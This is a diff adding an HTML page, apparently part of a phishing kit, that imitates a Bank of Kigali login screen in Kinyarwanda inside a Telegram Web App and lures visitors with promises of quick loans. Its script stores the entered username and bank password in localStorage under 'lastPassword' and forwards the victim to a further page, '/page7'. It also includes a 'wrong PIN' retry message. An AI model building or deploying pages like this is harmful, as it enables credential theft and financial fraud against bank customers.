@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="rw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bank of Kigali - Injira</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --bk-blue: #002b49;
+            --bk-blue-gradient: linear-gradient(180deg, #003f6b 0%, #002b49 100%);
+            --bg-color: #ffffff;
+            --text-dark: #0f172a;
+            --text-muted: #64748b;
+            --border-blue: #002b49;
+            --btn-disabled-bg: #e2e8f0;
+            --btn-disabled-text: #94a3b8;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body { 
+            background-color: var(--bg-color); 
+            margin: 0; 
+            padding: 0;
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh; 
+        }
+
+        .header-box { 
+            width: 100%; 
+            background: var(--bk-blue-gradient); 
+            padding: 30px 20px 25px; 
+            color: white; 
+            text-align: center; 
+        }
+
+        .header-title {
+            font-size: 28px;
+            font-weight: 800;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .header-title .bk-part { color: #ffffff; }
+
+        .sub-header-text { 
+            font-size: 14px; 
+            margin-top: 6px; 
+            font-weight: 500;
+            color: #cbd5e1;
+        }
+
+        .main-content { 
+            width: 90%; 
+            max-width: 400px; 
+            margin: 25px auto 0; 
+            text-align: center; 
+            flex-grow: 1; 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h2 { 
+            color: #334155; 
+            font-size: 22px; 
+            margin: 10px 0 25px; 
+            font-weight: 600; 
+        }
+
+        .input-group {
+            width: 100%;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            width: 100%;
+            border: 1.5px solid var(--border-blue);
+            border-radius: 12px;
+            padding: 14px 16px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #0f172a;
+            background-color: #f8fafc;
+            outline: none;
+        }
+
+        .form-control:focus {
+            background-color: #ffffff;
+            border-width: 2px;
+        }
+
+        .forgot-password {
+            color: var(--text-muted);
+            font-size: 13px;
+            text-decoration: none;
+            margin-bottom: 35px;
+            display: inline-block;
+            align-self: flex-start;
+        }
+
+        .btn-submit {
+            background-color: var(--btn-disabled-bg);
+            color: var(--btn-disabled-text);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: not-allowed;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit.active {
+            background-color: var(--bk-blue);
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        .btn-submit.active:hover {
+            background-color: var(--bk-blue-hover);
+        }
+
+        .error-banner {
+            background-color: #fee2e2;
+            color: #dc2626;
+            border: 1px solid #fca5a5;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            width: 100%;
+            display: none;
+        }
+
+        .footer-box { 
+            width: 100%; 
+            background: var(--bk-blue-gradient); 
+            padding: 35px 20px 20px; 
+            color: white; 
+            text-align: center; 
+            border-top-left-radius: 50% 30px; 
+            border-top-right-radius: 50% 30px; 
+            margin-top: auto;
+        }
+
+        .footer-title {
+            font-size: 24px;
+            font-weight: 800;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .terms-text { 
+            font-size: 11px; 
+            margin-top: 15px; 
+            padding: 0 20px; 
+            line-height: 1.4; 
+            color: #cbd5e1;
+        }
+
+        .terms-text u { 
+            color: #ffffff; 
+            cursor: pointer; 
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="header-box">
+    <div class="header-title">
+        <span class="bk-part">Bank of Kigali</span>
+    </div>
+    <div class="sub-header-text">Inguzanyo Zihuse & Zoroshye</div>
+</div>
+
+<div class="main-content">
+    <h2>Injira muri Konti</h2>
+
+    <div id="errorDisplay" class="error-banner"></div>
+
+    <div class="input-group">
+        <label for="usernameInput">Izina ry'Ubwinjiro (Username)</label>
+        <input type="text" id="usernameInput" class="form-control" placeholder="Andika izina ryawe" autocomplete="username">
+    </div>
+
+    <div class="input-group">
+        <label for="passwordInput">Ijambo ry'Ibanga (Bank Password)</label>
+        <input type="password" id="passwordInput" class="form-control" placeholder="Andika ijambo ry'ibanga" autocomplete="current-password">
+    </div>
+
+    <a href="#" class="forgot-password">Wibagiwe ijambo ry'ibanga?</a>
+
+    <button id="loginBtn" class="btn-submit" disabled>INJIRA</button>
+</div>
+
+<div class="footer-box">
+    <div class="footer-title">
+        <span class="bk-part">Bank of Kigali</span>
+    </div>
+    <div class="sub-header-text">Inguzanyo Zihuse & Zoroshye</div>
+    <p class="terms-text">Mu kwiyandikisha, wemera amategeko n'amabwiriza yacu <u>Amabwiriza n'Uburyo</u></p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const usernameInput = document.getElementById('usernameInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const loginBtn = document.getElementById('loginBtn');
+    const errorDisplay = document.getElementById('errorDisplay');
+
+    const savedUsername = localStorage.getItem('username') || "";
+    if (savedUsername) {
+        usernameInput.value = savedUsername;
+    }
+
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('error') === 'wrongpin') {
+        errorDisplay.innerText = "❌ Amakuru si yo, ongera ugerageze.";
+        errorDisplay.style.display = "block";
+    }
+
+    function checkInputs() {
+        const uVal = usernameInput.value.trim();
+        const pVal = passwordInput.value.trim();
+        const isValid = uVal.length > 0 && pVal.length > 0;
+        
+        loginBtn.disabled = !isValid;
+        loginBtn.classList.toggle('active', isValid);
+    }
+
+    usernameInput.addEventListener('input', checkInputs);
+    passwordInput.addEventListener('input', checkInputs);
+    checkInputs();
+
+    loginBtn.addEventListener('click', () => {
+        if (!loginBtn.classList.contains('active')) return;
+        
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('active');
+
+        const uVal = usernameInput.value.trim();
+        const pVal = passwordInput.value.trim();
+
+        localStorage.setItem('username', uVal);
+        localStorage.setItem('lastPassword', pVal);
+
+        errorDisplay.style.display = "none";
+
+        window.location.href = "/page7";
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
